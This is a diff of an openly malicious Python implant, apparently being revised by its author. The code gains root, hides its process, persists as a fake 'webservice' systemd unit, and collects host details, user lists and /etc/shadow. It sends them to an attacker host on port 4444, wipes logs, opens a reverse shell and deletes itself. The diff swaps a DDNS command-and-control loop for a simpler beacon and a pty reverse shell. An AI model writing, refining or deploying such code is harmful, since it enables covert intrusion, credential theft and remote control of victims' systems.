@@ -3,14 +3,11 @@ import os
 import subprocess
 import socket
 import psutil  # pip install psutil for process hiding
-import pty
+import pty  # For proper TTY
 import time
-import select
-import uuid
-import threading
 
 # Configuration
-ATTACKER_IP = "botconnect.ddns.net"  # Attacker's IP
+ATTACKER_IP = "192.168.1.100"  # Attacker's IP
 PORT = 4444  # Port for reverse shell and server
 HIDDEN_DIR = "/var/tmp/.webservice"  # Hidden directory
 HIDDEN_FILE = f"{HIDDEN_DIR}/webservice.py"  # Hidden file
@@ -23,8 +20,6 @@ PERSIST_METHODS = [
     f"mkdir -p /etc/systemd/system; echo '[Unit]\nDescription=Web Service\n[Service]\nExecStart=python3 {HIDDEN_FILE}\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/webservice.service; systemctl enable webservice.service 2>/dev/null"
 ]
 SUDOERS_FILE = "/etc/sudoers.d/webservice"
-RETRY_INTERVALS = [5, 10, 15, 30, 60]  # Gradual retry intervals in seconds
-UUID = str(uuid.uuid4())  # Generate unique client ID
 
 # Check and elevate to root if possible
 if os.geteuid() != 0:
@@ -70,7 +65,7 @@ except Exception:
     pass  # Fallback if psutil fails
 
 # Data Exfiltration
-info = f"Hostname: {os.uname().nodename}\nOS: {os.uname().sysname} {os.uname().release}\nIP: {subprocess.getoutput('ip addr show | grep inet | awk \'{print $2}\' | paste -sd \',\'')}\nUsers: {subprocess.getoutput('cat /etc/passwd | cut -d: -f1 | paste -sd \',\'')}\nUptime: {subprocess.getoutput('uptime')}\nDisk Usage: {subprocess.getoutput('df -h | grep -v tmpfs | grep -v udev')}"
+info = f"Hostname: {os.uname().nodename}\nOS: {os.uname().sysname} {os.uname().release}\nIP: {subprocess.getoutput('ip addr show | grep inet | awk \'{print $2}\' | paste -sd \',\'')}\nUsers: {subprocess.getoutput('cat /etc/passwd | cut -d: -f1 | paste -sd \',\'')}"
 
 # Try root password from /etc/shadow
 if is_admin == "Yes":
@@ -79,83 +74,15 @@ if is_admin == "Yes":
 else:
     info += "\nNon-root: Shadow not readable. Other Users: " + subprocess.getoutput('grep -v root /etc/passwd | cut -d: -f1,6 | paste -sd \',\' 2>/dev/null')
 
-# Custom command handler
-def handle_custom_command(cmd):
-    if cmd == "status":
-        return f"Status: Active\nAdmin: {is_admin}\nPID: {os.getpid()}\nUUID: {UUID}\nUptime: {subprocess.getoutput('uptime')}"
-    elif cmd == "info":
-        return info
-    else:
-        return f"Unknown command: {cmd}"
-
-# Heartbeat function
-def send_heartbeat(s):
-    while True:
-        try:
-            s.send(f"KEEPALIVE:{UUID}\n".encode('utf-8'))
-            time.sleep(10)
-        except Exception:
-            break
-
-# Single connection for messages and shell
-while True:
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(90)
-        s.connect((ATTACKER_IP, PORT))
-        # Send initial messages
-        messages = [
-            f"MSG:CONN:sono connesso! Admin: {is_admin} UUID: {UUID}",
-            f"MSG:INFO:{info}",
-            f"MSG:STATUS:Payload active, awaiting shell commands",
-            f"MSG:SHELL:START"
-        ]
-        for msg in messages:
-            s.send((msg + "\n").encode('utf-8'))
-            time.sleep(0.1)
-        
-        # Start heartbeat in separate thread
-        threading.Thread(target=send_heartbeat, args=(s,), daemon=True).start()
-        
-        # Start interactive shell with custom command support
-        def read_from_socket(fd):
-            r, _, _ = select.select([s], [], [], 0.1)
-            if s in r:
-                data = s.recv(4096).decode('utf-8')
-                if data.startswith("KEEPALIVE:"):
-                    return b""
-                return data.encode('utf-8')
-            return b""
-        
-        def write_to_socket(fd, data):
-            try:
-                cmd = data.decode('utf-8').strip()
-                if cmd in ["status", "info"]:
-                    response = handle_custom_command(cmd)
-                    s.send((response + "\n").encode('utf-8'))
-                else:
-                    s.send(data)
-            except Exception:
-                pass
-        
-        pty.spawn(["/bin/bash", "-i"], read_from_socket, write_to_socket)
-        s.close()
-    except Exception as e:
-        print(f"[ERROR] Connection failed: {e}")
-        # Gradual retry with increasing intervals
-        for interval in RETRY_INTERVALS:
-            time.sleep(interval)
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(1)
-                s.connect((ATTACKER_IP, PORT))
-                s.close()
-                break
-            except Exception:
-                continue
-        else:
-            continue
-        break
+# Send "sono connesso!" with admin status and info to server
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ATTACKER_IP, PORT))
+    s.send(f"sono connesso! Admin: {is_admin}\n".encode('utf-8'))
+    s.send(info.encode('utf-8'))
+    s.close()
+except Exception:
+    pass  # Silent fail if server is down
 
 # Clean logs to hide tracks
 for log in LOG_FILES:
@@ -164,6 +91,20 @@ for log in LOG_FILES:
             open(log, 'w').close()
         except PermissionError:
             pass
+
+# Reverse Shell (hidden process with TTY)
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ATTACKER_IP, PORT))
+    pid, fd = pty.fork()
+    if pid == 0:
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        subprocess.call(["/bin/sh", "-i"])
+    s.close()
+except Exception:
+    pass
 
 # Self-delete to make removal harder
 try:
